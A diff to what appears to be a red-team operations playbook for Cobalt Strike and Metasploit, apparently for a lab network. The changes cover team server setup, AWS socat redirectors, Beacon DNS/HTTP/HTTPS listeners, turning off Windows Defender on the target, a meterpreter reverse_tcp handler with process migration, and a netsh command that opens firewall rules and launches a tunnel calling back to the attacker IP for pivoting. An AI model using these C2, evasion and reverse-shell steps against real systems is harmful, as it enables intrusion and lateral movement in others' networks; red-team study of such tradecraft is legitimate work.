@@ -13,6 +13,10 @@ Install or update
     cd /opt/cobaltstrike/
     ./update
 
+Remove old data and Beacons (optional)
+    Stop the team server
+    rm -rf /opt/cobaltstrike/data/
+
 Start the team server
     There are 2 mandotory parameters and 2 optional parameters. The first 2 parameters are required.
     ./teamserver <IP> <password> <Malleable C2 profile> <kill date for Beacons yyyy-mm-dd>
@@ -31,33 +35,42 @@ Login to the team server
     Password: <password you entered above>
     Connect
     VerifyFingerprint (SHA256 hash) > Yes
-
-Remove old data as needed
-    Stop the team server
-    rm -rf /opt/cobaltstrike/data/
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# HTTP Redirector
+# Redirectors
 
-Create a Ubuntu instance in AWS, install socat and point it to your CS server.
-When creating a listener, use the IP of your Ubuntu instance.
-
-screen
-socat TCP4-LISTEN:80,fork TCP4:<CS server IP>:80
+Create 3 free Ubuntu instances in AWS. These instances will be used for the following:
+    Redirector1 - DNS
+    Redirector2 - HTTP
+    Redirector3 - HTTP3
+    
+Install socat on each instance.
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# Create an HTTP Listener
+# Create Listeners
 
 Cobalt Strike > Listeners > Add
-Name: Initial access
+Name: DNS
+Payload: Beacon DNS
+DNS Hosts: click + <Redirector1 IP>
+OK > Save > OK
+
+Add
+Name: HTTP
 Payload: Beacon HTTP
-HTTP Hosts: click the plus sign > you should see your IP address > OK
-Save > OK
+HTTP Hosts: click + <Redirector2 IP>
+OK > Save > OK
+
+Add
+Name: HTTPS
+Payload: Beacon HTTPS
+HTTPS Hosts: click + <Redirector3 IP>
+OK > Save > OK
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Launch an attack to gain a foothold.
 
-Disable Windows Defender on your Windows VM.
+Disable Windows Defender on your target Windows VM.
     Enterprise: Windows Security > Virus & threat protection > Manage settings > turn off Real-time protection > Yes
     Standard: Windows Defender settings > turn off Real-time protection
 
@@ -317,7 +330,7 @@ note 3rd hop
 # Catch the callback from wkstn-04
 use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_tcp
-set lhost 200.200.200.80
+set lhost 10.0.0.80
 set lport 443
 run
 migrate -N explorer.exe
@@ -325,7 +338,7 @@ migrate -N explorer.exe
 # Make tunnels for wkuser-66
 upload fpipeknockoff.windows.amd64.exe s:\\
 shell
-netsh advfirewall firewall delete rule  name="fpipeknockoff" program="\\site-file\share\fpipeknockoff.windows.amd64.exe" & netsh advfirewall firewall add rule name="fpipeknockoff" dir=in action=allow program="\\site-file\share\fpipeknockoff.windows.amd64.exe" enable=yes & \\site-file\share\fpipeknockoff.windows.amd64.exe -c 200.200.200.80:443 <NUL >NUL 2>NUL & exit
+netsh advfirewall firewall delete rule  name="fpipeknockoff" program="\\site-file\share\fpipeknockoff.windows.amd64.exe" & netsh advfirewall firewall add rule name="fpipeknockoff" dir=in action=allow program="\\site-file\share\fpipeknockoff.windows.amd64.exe" enable=yes & \\site-file\share\fpipeknockoff.windows.amd64.exe -c 10.0.0.80:443 <NUL >NUL 2>NUL & exit
 run post/multi/manage/autoroute CMD=add netmask=/32 subnet=172.31.2.66
 background
 
